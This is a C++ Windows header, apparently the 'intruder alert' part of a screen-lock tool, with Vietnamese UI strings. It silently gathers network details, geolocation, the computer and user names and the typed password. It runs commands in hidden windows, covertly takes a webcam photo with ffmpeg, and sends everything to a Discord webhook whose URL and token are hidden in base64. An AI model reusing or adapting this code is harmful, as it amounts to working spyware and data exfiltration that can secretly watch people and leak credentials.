#pragma once
#include <wininet.h>
#include <string>
#include <cstring>
#include <vector>
#pragma comment(lib, "wininet.lib")

static const char* WH_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

// ===== String Helpers =====

inline std::string B64D(const char* in) {
    int T[128]; memset(T, -1, sizeof(T));
    const char* a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    for (int i = 0; a[i]; i++) T[(int)a[i]] = i;
    std::string o; int v = 0, b = -8;
    for (int i = 0; in[i]; i++) {
        int c = (unsigned char)in[i];
        if (c >= 128 || T[c] == -1) break;
        v = (v << 6) + T[c]; b += 6;
        if (b >= 0) { o += (char)((v >> b) & 0xFF); b -= 8; }
    }
    return o;
}

inline std::string JEsc(const std::string& s) {
    std::string r;
    for (char c : s) {
        if (c == '"') { r += '\\'; r += '"'; }
        else if (c == '\\') { r += '\\'; r += '\\'; }
        else if (c == '\n') { r += '\\'; r += 'n'; }
        else if (c == '\r') { /* skip */ }
        else r += c;
    }
    return r;
}

inline std::string TrimStr(const std::string& s) {
    size_t a = s.find_first_not_of(" \t\r\n");
    size_t b = s.find_last_not_of(" \t\r\n");
    return (a != std::string::npos && b != std::string::npos) ? s.substr(a, b - a + 1) : "";
}

inline std::string JsonVal(const std::string& json, const std::string& key) {
    std::string search = std::string("\"") + key + "\"";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";
    pos = json.find(':', pos + search.size());
    if (pos == std::string::npos) return "";
    pos++;
    while (pos < json.size() && (json[pos] == ' ' || json[pos] == '\t')) pos++;
    if (pos >= json.size()) return "";
    if (json[pos] == '"') {
        size_t end = json.find('"', pos + 1);
        return (end != std::string::npos) ? json.substr(pos + 1, end - pos - 1) : "";
    }
    size_t end = json.find_first_of(",} \n\r", pos);
    return (end != std::string::npos) ? TrimStr(json.substr(pos, end - pos)) : TrimStr(json.substr(pos));
}

inline std::string GetWebhookPath() {
    std::string url = B64D(
        "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv"
        "MTU1MTU0NTY3NDU2OTYxMzMyMy9LVXpDT3c0UFIzU180"
        "TXZMSEtKVnd4aDBWX2p2aFZSVUcwMG1KdzZCSUpHcGI1"
        "VnVSdHJpNk5wQ2ZuU1ZZOFJsVUJONg==");
    size_t ps = url.find("/api/");
    return (ps != std::string::npos) ? url.substr(ps) : "/";
}

// ===== Command & HTTP =====

inline std::string RunCmd(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa = {}; sa.nLength = sizeof(sa); sa.bInheritHandle = TRUE;
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "";
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
    STARTUPINFOA si = {}; si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWrite; si.hStdError = hWrite; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};
    std::string cmdLine = "cmd /c " + cmd;
    std::vector<char> buf(cmdLine.begin(), cmdLine.end());
    buf.push_back('\0');
    if (!CreateProcessA(NULL, buf.data(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite); return "";
    }
    CloseHandle(hWrite);
    std::string output; char readBuf[4096]; DWORD bytesRead;
    while (ReadFile(hRead, readBuf, sizeof(readBuf) - 1, &bytesRead, NULL) && bytesRead > 0) {
        readBuf[bytesRead] = '\0'; output += readBuf;
    }
    CloseHandle(hRead);
    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return output;
}

inline std::string HttpGet(const char* host, const char* path, bool https = false) {
    HINTERNET h1 = InternetOpenA(WH_UA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!h1) return "";
    INTERNET_PORT port = https ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;
    HINTERNET h2 = InternetConnectA(h1, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!h2) { InternetCloseHandle(h1); return ""; }
    DWORD fl = INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;
    if (https) fl |= INTERNET_FLAG_SECURE;
    HINTERNET h3 = HttpOpenRequestA(h2, "GET", path, NULL, NULL, NULL, fl, 0);
    if (!h3) { InternetCloseHandle(h2); InternetCloseHandle(h1); return ""; }
    if (!HttpSendRequestA(h3, NULL, 0, NULL, 0)) {
        InternetCloseHandle(h3); InternetCloseHandle(h2); InternetCloseHandle(h1); return "";
    }
    std::string result; char buf[4096]; DWORD br;
    while (InternetReadFile(h3, buf, sizeof(buf) - 1, &br) && br > 0) {
        buf[br] = '\0'; result += buf;
    }
    InternetCloseHandle(h3); InternetCloseHandle(h2); InternetCloseHandle(h1);
    return result;
}

// ===== System Info =====

inline std::string GetWifiSSID() {
    std::string out = RunCmd("netsh wlan show interfaces");
    size_t pos = 0;
    while ((pos = out.find("SSID", pos)) != std::string::npos) {
        if (pos > 0 && (out[pos - 1] == 'B' || out[pos - 1] == 'b')) { pos++; continue; }
        size_t col = out.find(':', pos);
        if (col == std::string::npos) break;
        size_t eol = out.find_first_of("\r\n", col);
        std::string val = TrimStr(out.substr(col + 1, eol - col - 1));
        if (!val.empty()) return val;
        break;
    }
    return "Ethernet / Wi-Fi off";
}

inline std::string GetLocalIP() {
    std::string out = RunCmd("ipconfig");
    size_t pos = 0;
    while ((pos = out.find("IPv4", pos)) != std::string::npos) {
        size_t col = out.find(':', pos);
        if (col != std::string::npos) {
            size_t eol = out.find_first_of("\r\n", col);
            std::string ip = TrimStr(out.substr(col + 1, eol - col - 1));
            if (!ip.empty() && ip.substr(0, 4) != "127.") return ip;
        }
        pos++;
    }
    return "N/A";
}

inline std::string GetGateway() {
    std::string out = RunCmd("ipconfig");
    size_t pos = out.find("Gateway");
    if (pos == std::string::npos) pos = out.find("gateway");
    if (pos == std::string::npos) return "N/A";
    size_t col = out.find(':', pos);
    if (col == std::string::npos) return "N/A";
    size_t eol = out.find_first_of("\r\n", col);
    std::string gw = TrimStr(out.substr(col + 1, eol - col - 1));
    return gw.empty() ? "N/A" : gw;
}

inline std::string GetTimestamp() {
    SYSTEMTIME st; GetLocalTime(&st);
    char buf[64];
    sprintf_s(buf, "%04d-%02d-%02d %02d:%02d:%02d",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    return buf;
}

inline std::string GetPowerInfo() {
    SYSTEM_POWER_STATUS sps;
    if (GetSystemPowerStatus(&sps)) {
        if (sps.BatteryFlag == 128 || sps.BatteryFlag == 255)
            return "Nguon AC (Cam sac / PC)";
        char buf[64];
        sprintf_s(buf, "%d%% (Pin Laptop)", sps.BatteryLifePercent);
        return buf;
    }
    return "N/A";
}

// ===== JSON Embed Builder =====

inline void JAddField(std::string& json, const char* name, const std::string& value, bool isInline = false) {
    char q = '"';
    if (!json.empty() && json.back() != '[') json += ',';
    json += '{';
    json += q; json += "name"; json += q; json += ':';
    json += q; json += JEsc(std::string(name)); json += q; json += ',';
    json += q; json += "value"; json += q; json += ':';
    json += q; json += JEsc(value); json += q;
    if (isInline) { json += ','; json += q; json += "inline"; json += q; json += ":true"; }
    json += '}';
}

// ===== Discord Sender =====

inline bool PostToDiscord(const std::string& json) {
    std::string whPath = GetWebhookPath();
    bool ok = false;
    HINTERNET h1 = InternetOpenA(WH_UA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (h1) {
        HINTERNET h2 = InternetConnectA(h1, "discord.com", INTERNET_DEFAULT_HTTPS_PORT,
            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (h2) {
            DWORD fl = INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;
            HINTERNET h3 = HttpOpenRequestA(h2, "POST", whPath.c_str(), NULL, NULL, NULL, fl, 0);
            if (h3) {
                const char* hdr = "Content-Type: application/json\r\n";
                ok = HttpSendRequestA(h3, hdr, -1, (LPVOID)json.c_str(), (DWORD)json.size()) != 0;
                InternetCloseHandle(h3);
            }
            InternetCloseHandle(h2);
        }
        InternetCloseHandle(h1);
    }
    return ok;
}

inline bool PostToDiscordWithFile(const std::string& json, const std::string& filePath, const std::string& fileName, const std::string& mime) {
    std::string whPath = GetWebhookPath();
    // Read file
    HANDLE hf = CreateFileA(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return false;
    DWORD sz = GetFileSize(hf, NULL);
    if (sz < 100 || sz > 8000000) { CloseHandle(hf); return false; }
    std::vector<char> fileData(sz); DWORD br;
    ReadFile(hf, fileData.data(), sz, &br, NULL);
    CloseHandle(hf);

    std::string bnd = "----FormBoundary7MA4YWxk9Z";
    std::string body;
    body += "--" + bnd + "\r\n";
    body += "Content-Disposition: form-data; name=\"payload_json\"\r\n";
    body += "Content-Type: application/json; charset=utf-8\r\n\r\n";
    body += json + "\r\n";
    body += "--" + bnd + "\r\n";
    body += "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" + fileName + "\"\r\n";
    body += "Content-Type: " + mime + "\r\n\r\n";
    std::string footer = "\r\n--" + bnd + "--\r\n";

    std::vector<char> fullBody;
    fullBody.insert(fullBody.end(), body.begin(), body.end());
    fullBody.insert(fullBody.end(), fileData.begin(), fileData.end());
    fullBody.insert(fullBody.end(), footer.begin(), footer.end());

    bool ok = false;
    HINTERNET h1 = InternetOpenA(WH_UA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (h1) {
        HINTERNET h2 = InternetConnectA(h1, "discord.com", INTERNET_DEFAULT_HTTPS_PORT,
            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (h2) {
            DWORD fl = INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;
            HINTERNET h3 = HttpOpenRequestA(h2, "POST", whPath.c_str(), NULL, NULL, NULL, fl, 0);
            if (h3) {
                std::string hdr = "Content-Type: multipart/form-data; boundary=" + bnd + "\r\n";
                ok = HttpSendRequestA(h3, hdr.c_str(), (DWORD)hdr.size(),
                    fullBody.data(), (DWORD)fullBody.size()) != 0;
                InternetCloseHandle(h3);
            }
            InternetCloseHandle(h2);
        }
        InternetCloseHandle(h1);
    }
    return ok;
}

// ===== Webcam Capture (ffmpeg only, no extra dependencies) =====

inline std::string CaptureWebcam() {
    char tempDir[MAX_PATH];
    GetTempPathA(MAX_PATH, tempDir);
    std::string photoPath = std::string(tempDir) + "intruder_capture.jpg";
    DeleteFileA(photoPath.c_str());

    std::string ffmpegPath;
    const char* candidates[] = {
        "C:\\ProgramData\\chocolatey\\bin\\ffmpeg.exe",
        "C:\\ffmpeg\\bin\\ffmpeg.exe",
        "C:\\tools\\ffmpeg\\bin\\ffmpeg.exe"
    };
    for (const char* p : candidates) {
        if (GetFileAttributesA(p) != INVALID_FILE_ATTRIBUTES) { ffmpegPath = p; break; }
    }
    if (ffmpegPath.empty()) {
        char found[MAX_PATH];
        if (SearchPathA(NULL, "ffmpeg.exe", NULL, MAX_PATH, found, NULL))
            ffmpegPath = found;
    }
    if (ffmpegPath.empty()) return "";

    std::string devOut = RunCmd("\"" + ffmpegPath + "\" -list_devices true -f dshow -i dummy 2>&1");
    std::string camName, bestCam;
    size_t pos = 0;
    while ((pos = devOut.find("\"", pos)) != std::string::npos) {
        size_t end = devOut.find("\"", pos + 1);
        if (end == std::string::npos) break;
        std::string name = devOut.substr(pos + 1, end - pos - 1);
        size_t chk = devOut.find("\n", end);
        std::string rest = devOut.substr(end, chk != std::string::npos ? chk - end : 50);
        if (rest.find("(video)") != std::string::npos) {
            if (bestCam.empty()) bestCam = name;
            if (name.find("Virtual") == std::string::npos && name.find("OBS") == std::string::npos)
                camName = name;
        }
        pos = end + 1;
    }
    if (camName.empty()) camName = bestCam;
    if (camName.empty()) return "";

    std::string captureCmd = "\"" + ffmpegPath + "\" -y -f dshow -i \"video=" + camName + "\" -frames:v 1 -q:v 2 \"" + photoPath + "\"";
    STARTUPINFOA si = {}; si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};
    std::vector<char> cmdBuf(captureCmd.begin(), captureCmd.end());
    cmdBuf.push_back('\0');
    if (CreateProcessA(NULL, cmdBuf.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }

    HANDLE hf = CreateFileA(photoPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return "";
    DWORD sz = GetFileSize(hf, NULL);
    CloseHandle(hf);
    if (sz < 1000) { DeleteFileA(photoPath.c_str()); return ""; }
    return photoPath;
}

// ===== Build Embed JSON =====

inline std::string BuildEmbedJson(const std::string& key, const std::string& pc, const std::string& usr, bool hasPhoto = false) {
    // Gather info
    std::string geoJson = HttpGet("ip-api.com", "/json");
    std::string publicIp = JsonVal(geoJson, "query");
    std::string isp = JsonVal(geoJson, "isp");
    std::string org = JsonVal(geoJson, "org");
    std::string city = JsonVal(geoJson, "city");
    std::string region = JsonVal(geoJson, "regionName");
    std::string country = JsonVal(geoJson, "country");
    std::string lat = JsonVal(geoJson, "lat");
    std::string lon = JsonVal(geoJson, "lon");
    std::string ssid = GetWifiSSID();
    std::string localIp = GetLocalIP();
    std::string gateway = GetGateway();
    std::string timestamp = GetTimestamp();
    std::string powerInfo = GetPowerInfo();
    if (publicIp.empty()) publicIp = "N/A";
    if (isp.empty()) isp = "N/A";
    if (org.empty()) org = isp;

    char q = '"';
    std::string fields;
    JAddField(fields, "Mat khau ke xam nhap vua thu", "`" + key + "`");

    std::string locVal = "**ISP:** " + isp + " (" + org + ")\n";
    locVal += "**Vi tri:** " + city + ", " + region + ", " + country + "\n";
    if (!lat.empty() && !lon.empty())
        locVal += "**Ban do:** [Xem toa do Google Maps](https://www.google.com/maps?q=" + lat + "," + lon + ")";
    JAddField(fields, "Vi tri & Nha mang (ISP)", locVal);

    std::string netVal = "**Wi-Fi SSID:** " + ssid + "\n";
    netVal += "**IP Cong khai:** " + publicIp + "\n";
    netVal += "**IP Cuc bo (LAN):** " + localIp + "\n";
    netVal += "**Gateway:** " + gateway;
    JAddField(fields, "Ket noi mang", netVal, true);

    std::string devVal = "**May tinh:** " + pc + "\n";
    devVal += "**Tai khoan:** " + usr + "\n";
    devVal += "**Nguon dien:** " + powerInfo + "\n";
    devVal += "**Thoi diem:** " + timestamp;
    JAddField(fields, "Thiet bi & Phien lam viec", devVal, true);

    std::string json;
    json += '{';
    json += q; json += "username"; json += q; json += ':';
    json += q; json += "He Thong Giam Sat An Ninh (Lock Engine)"; json += q; json += ',';
    json += q; json += "embeds"; json += q; json += ":[{";
    json += q; json += "title"; json += q; json += ':';
    json += q; json += "CANH BAO: PHAT HIEN TRUY CAP TRAI PHEP!"; json += q; json += ',';
    json += q; json += "color"; json += q; json += ":15158332,";
    json += q; json += "fields"; json += q; json += ":[" + fields + "]";

    if (hasPhoto) {
        json += ','; json += q; json += "image"; json += q; json += ":{";
        json += q; json += "url"; json += q; json += ':';
        json += q; json += "attachment://intruder_capture.jpg"; json += q; json += '}';
    }

    json += ','; json += q; json += "footer"; json += q; json += ":{";
    json += q; json += "text"; json += q; json += ':';
    json += q; json += "ID: SEC-ALERT-911 | Tu dong ghi lai boi Lock System"; json += q; json += '}';
    json += "}]}";

    return json;
}

// ===== Main Thread =====

struct WH_Data { std::string key, pc, usr; };

inline DWORD WINAPI DirectWebhookThread(LPVOID p) {
    WH_Data* d = (WH_Data*)p;

    // STEP 1: Send text embed IMMEDIATELY (guaranteed delivery)
    std::string jsonNoPhoto = BuildEmbedJson(d->key, d->pc, d->usr, false);
    PostToDiscord(jsonNoPhoto);

    // STEP 2: Try webcam capture (best effort, no crash risk)
    std::string photoPath = CaptureWebcam();
    if (!photoPath.empty()) {
        // Send a SECOND message with the photo attached
        std::string jsonWithPhoto = BuildEmbedJson(d->key, d->pc, d->usr, true);
        PostToDiscordWithFile(jsonWithPhoto, photoPath, "intruder_capture.jpg", "image/jpeg");
        DeleteFileA(photoPath.c_str());
    }

    delete d;
    return 0;
}

// ===== Public API =====

inline void SendDirectWebhook(const std::wstring& attemptedKey) {
    WH_Data* wd = new WH_Data();
    int kl = WideCharToMultiByte(CP_UTF8, 0, attemptedKey.c_str(), -1, NULL, 0, NULL, NULL);
    if (kl > 1) {
        wd->key.resize(kl - 1);
        WideCharToMultiByte(CP_UTF8, 0, attemptedKey.c_str(), -1, &wd->key[0], kl, NULL, NULL);
    }
    char buf[256] = {}; DWORD bl = sizeof(buf);
    GetComputerNameA(buf, &bl); wd->pc = buf;
    bl = sizeof(buf); GetUserNameA(buf, &bl); wd->usr = buf;
    CreateThread(NULL, 0, DirectWebhookThread, wd, 0, NULL);
}
